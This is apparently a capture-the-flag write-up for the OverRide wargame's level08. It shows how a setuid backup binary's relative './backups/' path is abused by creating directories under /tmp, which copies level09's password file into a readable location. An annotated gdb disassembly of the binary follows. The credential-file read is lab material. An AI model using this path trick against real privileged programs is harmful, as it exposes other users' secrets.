# LEVEL08
**Info: level protect option**
```sh
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level08/level08
```
```sh
level08@OverRide:~$ ./level08 
Usage: ./level08 filename
ERROR: Failed to open (null)
level08@OverRide:~$ ./level08 42
ERROR: Failed to open 42
```
We can find one excutable file **level08**, who takes one argument.
\
Sine this program reads file passed as argument, we can try to read file that our flag is contained. \
Note that programs owner is level09 and so is the level09's pass file.
```sh
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```
We tried for get .pass file in level09, but the program wants the directory /backups . \
We can see the path is relative starting with ```./backups```. \
```sh
drwxrwx---+ 1 level09 users    60 Oct 19  2016 backups
level08@OverRide:~$ mkdir backups
mkdir: cannot create directory `backups': File exists
level08@OverRide:~$ mkdir backups/home
mkdir: cannot create directory `backups/home': Permission denied
```
We don't have the permission to create some directory in ```~/backups```. So we move in ```/tmp``` to make the directory.
```sh
level08@OverRide:/tmp$ mkdir /tmp/backups/home
level08@OverRide:/tmp$ mkdir /tmp/backups/home/users
level08@OverRide:/tmp$ mkdir /tmp/backups/home/users/level09
level08@OverRide:/tmp$ /home/users/level08/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat /tmp/backups/home/users/level09/.pass
(hidden)
```
level08 passed!

assmebly analyze
---
```sh
(gdb) disas log_wrapper
Dump of assembler code for function log_wrapper:
   0x00000000004008c4 <+0>:     push   %rbp
   0x00000000004008c5 <+1>:     mov    %rsp,%rbp
   0x00000000004008c8 <+4>:     sub    $0x130,%rsp # 304 # rdi rsi rdx rcx
   0x00000000004008cf <+11>:    mov    %rdi,-0x118(%rbp) # 1st parameter 
   0x00000000004008d6 <+18>:    mov    %rsi,-0x120(%rbp) # 2nd parameter
   0x00000000004008dd <+25>:    mov    %rdx,-0x128(%rbp) # 3rd parameter
   0x00000000004008e4 <+32>:    mov    %fs:0x28,%rax # stack canary check
   0x00000000004008ed <+41>:    mov    %rax,-0x8(%rbp)
   0x00000000004008f1 <+45>:    xor    %eax,%eax
   0x00000000004008f3 <+47>:    mov    -0x120(%rbp),%rdx # 2nd parameter
   0x00000000004008fa <+54>:    lea    -0x110(%rbp),%rax # buffer[0x100]
   0x0000000000400901 <+61>:    mov    %rdx,%rsi
   0x0000000000400904 <+64>:    mov    %rax,%rdi
   0x0000000000400907 <+67>:    callq  0x4006f0 <strcpy@plt> # strcpy(buffer, 2nd para)
   0x000000000040090c <+72>:    mov    -0x128(%rbp),%rsi # 3rd parameter
   0x0000000000400913 <+79>:    lea    -0x110(%rbp),%rax
   0x000000000040091a <+86>:    movq   $0xffffffffffffffff,-0x130(%rbp)
   0x0000000000400925 <+97>:    mov    %rax,%rdx
   0x0000000000400928 <+100>:   mov    $0x0,%eax # 0
   0x000000000040092d <+105>:   mov    -0x130(%rbp),%rcx # 0xffffffffffffffff
   0x0000000000400934 <+112>:   mov    %rdx,%rdi
   0x0000000000400937 <+115>:   repnz scas %es:(%rdi),%al # strlen(buffer)
   0x0000000000400939 <+117>:   mov    %rcx,%rax
   0x000000000040093c <+120>:   not    %rax # ~rax
   0x000000000040093f <+123>:   lea    -0x1(%rax),%rdx # ret strlen(buffer)
   0x0000000000400943 <+127>:   mov    $0xfe,%eax # 254
   0x0000000000400948 <+132>:   mov    %rax,%r8 # 254
   0x000000000040094b <+135>:   sub    %rdx,%r8 # 0xfe - strlen(buffer)
   0x000000000040094e <+138>:   lea    -0x110(%rbp),%rax
   0x0000000000400955 <+145>:   movq   $0xffffffffffffffff,-0x130(%rbp)
   0x0000000000400960 <+156>:   mov    %rax,%rdx
   0x0000000000400963 <+159>:   mov    $0x0,%eax
   0x0000000000400968 <+164>:   mov    -0x130(%rbp),%rcx # 0xffffffffffffffff
   0x000000000040096f <+171>:   mov    %rdx,%rdi
   0x0000000000400972 <+174>:   repnz scas %es:(%rdi),%al # strlen()
   0x0000000000400974 <+176>:   mov    %rcx,%rax
   0x0000000000400977 <+179>:   not    %rax
   0x000000000040097a <+182>:   lea    -0x1(%rax),%rdx # strlen()
   0x000000000040097e <+186>:   lea    -0x110(%rbp),%rax
   0x0000000000400985 <+193>:   add    %rdx,%rax # buffer + strlen(buffer)
   0x0000000000400988 <+196>:   mov    %rsi,%rdx # 3rd parameter
   0x000000000040098b <+199>:   mov    %r8,%rsi
   0x000000000040098e <+202>:   mov    %rax,%rdi # buffer + strlen(buffer)
   0x0000000000400991 <+205>:   mov    $0x0,%eax
   0x0000000000400996 <+210>:   callq  0x400740 <snprintf@plt> # snprintf(char *str, size_t size, const char *format)
   0x000000000040099b <+215>:   lea    -0x110(%rbp),%rax # buffer[0x100]
   0x00000000004009a2 <+222>:   mov    $0x400d4c,%esi # "\n"
   0x00000000004009a7 <+227>:   mov    %rax,%rdi
   0x00000000004009aa <+230>:   callq  0x400780 <strcspn@plt> # strcspn(buffer[0x100], "\n")
   0x00000000004009af <+235>:   movb   $0x0,-0x110(%rbp,%rax,1) # buffer[strcspn(buffer, "\n")] = 0
   0x00000000004009b7 <+243>:   mov    $0x400d4e,%ecx # "LOG: %s\n"
   0x00000000004009bc <+248>:   lea    -0x110(%rbp),%rdx # buffer
   0x00000000004009c3 <+255>:   mov    -0x118(%rbp),%rax # 1st parameter
   0x00000000004009ca <+262>:   mov    %rcx,%rsi
   0x00000000004009cd <+265>:   mov    %rax,%rdi
   0x00000000004009d0 <+268>:   mov    $0x0,%eax # 0
   0x00000000004009d5 <+273>:   callq  0x4007a0 <fprintf@plt> # fprintf(1st parameter, "LOG: %s\n", buffer)
   0x00000000004009da <+278>:   mov    -0x8(%rbp),%rax
   0x00000000004009de <+282>:   xor    %fs:0x28,%rax # stack canary check
   0x00000000004009e7 <+291>:   je     0x4009ee <log_wrapper+298> # stack canary check
   0x00000000004009e9 <+293>:   callq  0x400720 <__stack_chk_fail@plt> # stack canary check
   0x00000000004009ee <+298>:   leaveq
   0x00000000004009ef <+299>:   retq
End of assembler dump.
(gdb) disas main
Dump of assembler code for function main:
   0x00000000004009f0 <+0>:     push   %rbp
   0x00000000004009f1 <+1>:     mov    %rsp,%rbp
   0x00000000004009f4 <+4>:     sub    $0xb0,%rsp # 176 # rdi rsi rdx rcx
   0x00000000004009fb <+11>:    mov    %edi,-0x94(%rbp) # ac
   0x0000000000400a01 <+17>:    mov    %rsi,-0xa0(%rbp) # av
   0x0000000000400a08 <+24>:    mov    %fs:0x28,%rax # stack canary check
   0x0000000000400a11 <+33>:    mov    %rax,-0x8(%rbp) # stack canary check
   0x0000000000400a15 <+37>:    xor    %eax,%eax # stack canary check
   0x0000000000400a17 <+39>:    movb   $0xff,-0x71(%rbp) # char var = -1
   0x0000000000400a1b <+43>:    movl   $0xffffffff,-0x78(%rbp) # int var -1
   0x0000000000400a22 <+50>:    cmpl   $0x2,-0x94(%rbp) # if (ac == 2)
   0x0000000000400a29 <+57>:    je     0x400a4a <main+90>
   0x0000000000400a2b <+59>:    mov    -0xa0(%rbp),%rax # av
   0x0000000000400a32 <+66>:    mov    (%rax),%rdx # *av
   0x0000000000400a35 <+69>:    mov    $0x400d57,%eax # "Usage: %s filename\n"
   0x0000000000400a3a <+74>:    mov    %rdx,%rsi # av
   0x0000000000400a3d <+77>:    mov    %rax,%rdi 
   0x0000000000400a40 <+80>:    mov    $0x0,%eax
   0x0000000000400a45 <+85>:    callq  0x400730 <printf@plt> # printf("Usage: %s filename\n", *av)
   0x0000000000400a4a <+90>:    mov    $0x400d6b,%edx # "w"
   0x0000000000400a4f <+95>:    mov    $0x400d6d,%eax # "./backups/.log"
   0x0000000000400a54 <+100>:   mov    %rdx,%rsi
   0x0000000000400a57 <+103>:   mov    %rax,%rdi
   0x0000000000400a5a <+106>:   callq  0x4007c0 <fopen@plt> # fopen("./backups/.log", "w")
   0x0000000000400a5f <+111>:   mov    %rax,-0x88(%rbp) # var ret = fopen()
   0x0000000000400a66 <+118>:   cmpq   $0x0,-0x88(%rbp) # if ret != 0
   0x0000000000400a6e <+126>:   jne    0x400a91 <main+161>
   0x0000000000400a70 <+128>:   mov    $0x400d7c,%eax # "ERROR: Failed to open %s\n"
   0x0000000000400a75 <+133>:   mov    $0x400d6d,%esi # "./backups/.log"
   0x0000000000400a7a <+138>:   mov    %rax,%rdi
   0x0000000000400a7d <+141>:   mov    $0x0,%eax
   0x0000000000400a82 <+146>:   callq  0x400730 <printf@plt> # printf("ERROR: Failed to open %s\n", "./backups/.log")
   0x0000000000400a87 <+151>:   mov    $0x1,%edi # exit(1)
   0x0000000000400a8c <+156>:   callq  0x4007d0 <exit@plt>
   0x0000000000400a91 <+161>:   mov    -0xa0(%rbp),%rax # av
   0x0000000000400a98 <+168>:   add    $0x8,%rax # av + 1
   0x0000000000400a9c <+172>:   mov    (%rax),%rdx # av[1]
   0x0000000000400a9f <+175>:   mov    -0x88(%rbp),%rax # var ret
   0x0000000000400aa6 <+182>:   mov    $0x400d96,%esi #  "Starting back up: "
   0x0000000000400aab <+187>:   mov    %rax,%rdi
   0x0000000000400aae <+190>:   callq  0x4008c4 <log_wrapper> # log_wrapper(ret,  "Starting back up: ", av[1])
   0x0000000000400ab3 <+195>:   mov    $0x400da9,%edx # "r"
   0x0000000000400ab8 <+200>:   mov    -0xa0(%rbp),%rax # av
   0x0000000000400abf <+207>:   add    $0x8,%rax # av + 1
   0x0000000000400ac3 <+211>:   mov    (%rax),%rax # av[1]
   0x0000000000400ac6 <+214>:   mov    %rdx,%rsi
   0x0000000000400ac9 <+217>:   mov    %rax,%rdi
   0x0000000000400acc <+220>:   callq  0x4007c0 <fopen@plt> # fopen(av[1], "r")
   0x0000000000400ad1 <+225>:   mov    %rax,-0x80(%rbp) # var ret2 = fopen()
   0x0000000000400ad5 <+229>:   cmpq   $0x0,-0x80(%rbp) # if ret2 == 0
   0x0000000000400ada <+234>:   jne    0x400b09 <main+281>
   0x0000000000400adc <+236>:   mov    -0xa0(%rbp),%rax # av
   0x0000000000400ae3 <+243>:   add    $0x8,%rax
   0x0000000000400ae7 <+247>:   mov    (%rax),%rdx # av[1]
   0x0000000000400aea <+250>:   mov    $0x400d7c,%eax # "ERROR: Failed to open %s\n"
   0x0000000000400aef <+255>:   mov    %rdx,%rsi
   0x0000000000400af2 <+258>:   mov    %rax,%rdi
   0x0000000000400af5 <+261>:   mov    $0x0,%eax
   0x0000000000400afa <+266>:   callq  0x400730 <printf@plt> # printf("ERROR: Failed to open %s\n", av[1])
   0x0000000000400aff <+271>:   mov    $0x1,%edi # exit(1)
   0x0000000000400b04 <+276>:   callq  0x4007d0 <exit@plt>
   0x0000000000400b09 <+281>:   mov    $0x400dab,%edx # "./backups/"
   0x0000000000400b0e <+286>:   lea    -0x70(%rbp),%rax # 
   0x0000000000400b12 <+290>:   mov    (%rdx),%rcx # 8 bytes copy
   0x0000000000400b15 <+293>:   mov    %rcx,(%rax)
   0x0000000000400b18 <+296>:   movzwl 0x8(%rdx),%ecx # get address 8th of string
   0x0000000000400b1c <+300>:   mov    %cx,0x8(%rax) # 2 bytes copy
   0x0000000000400b20 <+304>:   movzbl 0xa(%rdx),%edx # get address 10th of string
   0x0000000000400b24 <+308>:   mov    %dl,0xa(%rax) # 1 byte copy
   0x0000000000400b27 <+311>:   lea    -0x70(%rbp),%rax # *str_ptr = str;
   0x0000000000400b2b <+315>:   movq   $0xffffffffffffffff,-0xa8(%rbp)
   0x0000000000400b36 <+326>:   mov    %rax,%rdx
   0x0000000000400b39 <+329>:   mov    $0x0,%eax
   0x0000000000400b3e <+334>:   mov    -0xa8(%rbp),%rcx # 0xffffffffffffffff
   0x0000000000400b45 <+341>:   mov    %rdx,%rdi
   0x0000000000400b48 <+344>:   repnz scas %es:(%rdi),%al # strlen(str)
   0x0000000000400b4a <+346>:   mov    %rcx,%rax # 0xffffffffffffffff
   0x0000000000400b4d <+349>:   not    %rax # ~rax
   0x0000000000400b50 <+352>:   lea    -0x1(%rax),%rdx # strlen()
   0x0000000000400b54 <+356>:   mov    $0x63,%eax # 99
   0x0000000000400b59 <+361>:   mov    %rax,%rcx # 99
   0x0000000000400b5c <+364>:   sub    %rdx,%rcx # 99 - strlen
   0x0000000000400b5f <+367>:   mov    %rcx,%rdx
   0x0000000000400b62 <+370>:   mov    -0xa0(%rbp),%rax # av
   0x0000000000400b69 <+377>:   add    $0x8,%rax
   0x0000000000400b6d <+381>:   mov    (%rax),%rax # av[1]
   0x0000000000400b70 <+384>:   mov    %rax,%rcx
   0x0000000000400b73 <+387>:   lea    -0x70(%rbp),%rax # str
   0x0000000000400b77 <+391>:   mov    %rcx,%rsi
   0x0000000000400b7a <+394>:   mov    %rax,%rdi
   0x0000000000400b7d <+397>:   callq  0x400750 <strncat@plt> # strncat(str, av[1], 99 - strlen)
   0x0000000000400b82 <+402>:   lea    -0x70(%rbp),%rax # str
   0x0000000000400b86 <+406>:   mov    $0x1b0,%edx # 432
   0x0000000000400b8b <+411>:   mov    $0xc1,%esi # 193
   0x0000000000400b90 <+416>:   mov    %rax,%rdi
   0x0000000000400b93 <+419>:   mov    $0x0,%eax
   0x0000000000400b98 <+424>:   callq  0x4007b0 <open@plt> # open(str, 193, 0660(432))
   0x0000000000400b9d <+429>:   mov    %eax,-0x78(%rbp) # var ret = open()
   0x0000000000400ba0 <+432>:   cmpl   $0x0,-0x78(%rbp) # if ret == 0 
   0x0000000000400ba4 <+436>:   jns    0x400bed <main+509> # https://stackoverflow.com/questions/24542793/jump-not-signed-instruction-in-c
   0x0000000000400ba6 <+438>:   mov    -0xa0(%rbp),%rax # av
   0x0000000000400bad <+445>:   add    $0x8,%rax
   0x0000000000400bb1 <+449>:   mov    (%rax),%rdx # av[1]
   0x0000000000400bb4 <+452>:   mov    $0x400db6,%eax # "ERROR: Failed to open %s%s\n"
   0x0000000000400bb9 <+457>:   mov    $0x400dab,%esi # "./backups/"
   0x0000000000400bbe <+462>:   mov    %rax,%rdi
   0x0000000000400bc1 <+465>:   mov    $0x0,%eax
   0x0000000000400bc6 <+470>:   callq  0x400730 <printf@plt> # printf("ERROR: Failed to open %s%s\n", "./backups/", av[1])
   0x0000000000400bcb <+475>:   mov    $0x1,%edi # exit(1)
   0x0000000000400bd0 <+480>:   callq  0x4007d0 <exit@plt>
   0x0000000000400bd5 <+485>:   lea    -0x71(%rbp),%rcx # char var # loop start
   0x0000000000400bd9 <+489>:   mov    -0x78(%rbp),%eax # int var = open()
   0x0000000000400bdc <+492>:   mov    $0x1,%edx
   0x0000000000400be1 <+497>:   mov    %rcx,%rsi
   0x0000000000400be4 <+500>:   mov    %eax,%edi
   0x0000000000400be6 <+502>:   callq  0x400700 <write@plt> # write(fd, '\255', 1)
   0x0000000000400beb <+507>:   jmp    0x400bee <main+510>
   0x0000000000400bed <+509>:   nop
   0x0000000000400bee <+510>:   mov    -0x80(%rbp),%rax # ret2 = fopen()
   0x0000000000400bf2 <+514>:   mov    %rax,%rdi
   0x0000000000400bf5 <+517>:   callq  0x400760 <fgetc@plt> # fgetc(ret2)
   0x0000000000400bfa <+522>:   mov    %al,-0x71(%rbp)
   0x0000000000400bfd <+525>:   movzbl -0x71(%rbp),%eax # char var
   0x0000000000400c01 <+529>:   cmp    $0xff,%al # if char var == -1
   0x0000000000400c03 <+531>:   jne    0x400bd5 <main+485> # while(c != -1)
   0x0000000000400c05 <+533>:   mov    -0xa0(%rbp),%rax # av
   0x0000000000400c0c <+540>:   add    $0x8,%rax
   0x0000000000400c10 <+544>:   mov    (%rax),%rdx # av[1]
   0x0000000000400c13 <+547>:   mov    -0x88(%rbp),%rax # ret
   0x0000000000400c1a <+554>:   mov    $0x400dd2,%esi # "Finished back up "
   0x0000000000400c1f <+559>:   mov    %rax,%rdi
   0x0000000000400c22 <+562>:   callq  0x4008c4 <log_wrapper> # log_wrapper(ret fopen, "Finished back up ", av[1])
   0x0000000000400c27 <+567>:   mov    -0x80(%rbp),%rax # ret2
   0x0000000000400c2b <+571>:   mov    %rax,%rdi
   0x0000000000400c2e <+574>:   callq  0x400710 <fclose@plt> # fclose(ret2)
   0x0000000000400c33 <+579>:   mov    -0x78(%rbp),%eax # fd
   0x0000000000400c36 <+582>:   mov    %eax,%edi
   0x0000000000400c38 <+584>:   callq  0x400770 <close@plt> # close(ret open fd)
   0x0000000000400c3d <+589>:   mov    $0x0,%eax # return 0
   0x0000000000400c42 <+594>:   mov    -0x8(%rbp),%rdi
   0x0000000000400c46 <+598>:   xor    %fs:0x28,%rdi # stack canary check
   0x0000000000400c4f <+607>:   je     0x400c56 <main+614>  # stack canary check
   0x0000000000400c51 <+609>:   callq  0x400720 <__stack_chk_fail@plt>  # stack canary check
   0x0000000000400c56 <+614>:   leaveq 
   0x0000000000400c57 <+615>:   retq   
End of assembler dump.
```
